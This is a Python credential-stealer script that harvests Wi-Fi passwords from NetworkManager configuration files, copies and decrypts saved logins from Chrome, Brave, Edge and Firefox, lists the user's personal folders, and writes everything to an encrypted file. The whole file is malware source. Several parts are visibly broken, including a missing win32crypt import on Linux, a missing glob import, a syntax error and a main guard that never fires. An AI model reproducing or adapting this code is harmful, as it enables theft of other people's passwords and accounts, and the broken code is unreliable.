import subprocess
import os
import json
from base64 import b64decode
import base64
import sqlite3
from Cryptodome.Cipher import AES
from Crypto.PublicKey import RSA
import shutil
from datetime import datetime, timedelta
import sys
from cryptography.fernet import Fernet

RESULT = ""

key = b'9RmTuhsWSz7hcy_uxz72ci6hVCKQ5tc_Y18qJXIY3sE='
fernet = Fernet(key)
Enable_Encryption = "YES"


def spacer():
    return (("########################################################")+'\n')


def loadKeys(public):
    public = b64decode(public)
    pub = RSA.importKey(public)
    return pub


sys.stdout = open('.data', 'w')


def ender():
    global RESULT
    RESULT += ("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'
    RESULT += ("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'
    RESULT += ("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'


def encrypt(message):
    if(Enable_Encryption != "YES"):
        spacer()
        print("Printing in plane text format as RSA public key not provided,,,, please refer to README")
        spacer()
        return message
    return fernet.encrypt(message.encode())


def wifi_pass_stealler():
    global RESULT
    result = ""
    result += "WIFI PASSWORDS\n"

    data = subprocess.check_output(
        ['sudo', 'grep', '-r', '^psk=', '/etc/NetworkManager/system-connections/'], shell=True, stderr=sys.stdout).decode('utf-8').split('\n')
    for i in data:
        if "system-connections/" in i:
            ssid = i.split('/')[-1]
            password = i.split('psk=')[1]
            result += (("{:<30}|  {:<}".format(ssid, password)))+'\n'
    RESULT += result
    ender()


def chrome_pass_stealler():
    global RESULT
    result = ""
    result += "CHROME PASSWORDS\n"

    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["HOME"], ".config", "google-chrome",
            "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["HOME"], ".config",
                           "google-chrome", "Default", "Login Data")
    users = os.listdir("/home")
    cnt = 0
    for i in range(1, 10):
        if(users.count("Profile "+str(i))):
            cnt += 1
        else:
            break

    for userid in range(0, cnt+1):
        try:
            profile = "Profile "+str(userid)
            result += spacer()
            result += profile+'\n'
            result += spacer()
            if(userid == 0):
                profile = "Default"
            db_path = os.path.join(
                os.environ["HOME"], ".config", "google-chrome", profile, "Login Data")
            filename = "ChromePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue

def brave_pass_stealler():
    global RESULT
    result = ""
    result += "BRAVE PASSWORDS\n"

    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["HOME"], ".config", "BraveSoftware",
            "Brave-Browser", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["HOME"], ".config",
                           "BraveSoftware", "Brave-Browser", "Default", "Login Data")
    users = os.listdir("/home")
    cnt = 0
    for i in range(1, 10):
        if(users.count("Profile "+str(i))):
            cnt += 1
        else:
            break

    for userid in range(0, cnt+1):
        try:
            profile = "Profile "+str(userid)
            result += spacer()
            result += profile+'\n'
            result += spacer()
            if(userid == 0):
                profile = "Default"
            db_path = os.path.join(
                os.environ["HOME"], ".config", "BraveSoftware", "Brave-Browser", profile, "Login Data")
            filename = "BravePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")
            
            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue
    RESULT += result
    ender()

def edge_pass_stealler():
    global RESULT
    result = ""
    result += "EDGE PASSWORDS\n"

    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    
    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["HOME"], ".config", "Microsoft", "Edge", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
    
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["HOME"], ".config",
                           "Microsoft", "Edge", "Default", "Login Data")
    users = os.listdir("/home")
    cnt = 0
    for i in range(1, 10):
        if(users.count("Profile "+str(i))):
            cnt += 1
        else:
            break

    for userid in range(0, cnt+1):
        try:
            profile = "Profile "+str(userid)
            result += spacer()
            result += profile+'\n'
            result += spacer()
            if(userid == 0):
                profile = "Default"
            db_path = os.path.join(
                os.environ["HOME"], ".config", "Microsoft", "Edge", profile, "Login Data")
            filename = "EdgePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")
            
            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue

    RESULT += result
    ender()


def firefox_pass_stealler():
    global RESULT
    result = ""
    result += "FIREFOX PASSWORDS\n"

    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    
    def password_decryption(encrypted_password):
        try:
            decrypted_password = None
            master_password = None
            for filename in ["key3.db", "key4.db"]:
                path = os.path.join(os.environ["HOME"], ".mozilla", "firefox", filename)
                key_file=glob.glob(path)[0]
                conn = sqlite3.connect(key_file)
                cursor = conn.cursor()
                cursor.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
                for row in cursor.fetchall():
                    if row[0] == "password" and row[1][:3] == "$2a":
                    master_password = row[1]
                    break
            
            if master_password is not None:
                fernet_key = master_password.encode("utf-8").split(b"\x00")[1]
                fernet = Fernet(fernet_key)
                decrypted_password = fernet.decrypt(encrypted_password).decode("utf-8")
            else:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]

            return decrypted_password
        except:
            return "No Passwords"
    
    db_path=os.path.join(os.environ["HOME"], ".mozilla", "firefox", "profiles.ini")
    profiles=os.listdir("/home")
    for profile in profiles:
        try:
            filename = os.path.join(db_path, profile, "logins.json")
            with open(filename, "r", encoding="utf-8") as f:
                logins_data = json.loads(f.read())
                for login in logins_data["logins"]:
                    url = login["hostname"]
                    username = login["username"]
                    encrypted_password = login["encryptedPassword"]
                    decrypted_password = password_decryption(encrypted_password)
                    if username or decrypted_password:
                        result += f"URL: {url}\n"
                        result += f"Username: {username}\n"
                        result += f"Decrypted Password: {decrypted_password}\n"
        except:
            pass

    RESULT += result
    ender()
def enumerate_Directories():
    global RESULT
    lst=["Downloads","Documents","home","Desktop","Pictures","Videos","Music","Public"]
    result=''
    result+="Directory Enumeration\n"
    for i in lst:
        try:
            result+=spacer()
            result+=i+"\n"
            result+=spacer()
            result+=str(os.listdir(os.path.join(os.environ["HOME"],i)))+"\n"
        except:
            pass
    RESULT+=result
    ender()


if __name__ == 'main':
    try:
        os.remove(".data")
    except:
        pass
    print(wifi_pass_stealler())
    print(chrome_pass_stealler())
    print(edge_pass_stealler())
    print(firefox_pass_stealler())
    print(enumerate_Directories())


    with open(".data", "r") as file:
        data = file.read()

    print(data)

    with open("encrypted_data", "wb") as file:
        file.write(encrypt(data))

    print("Data encrypted successfully")

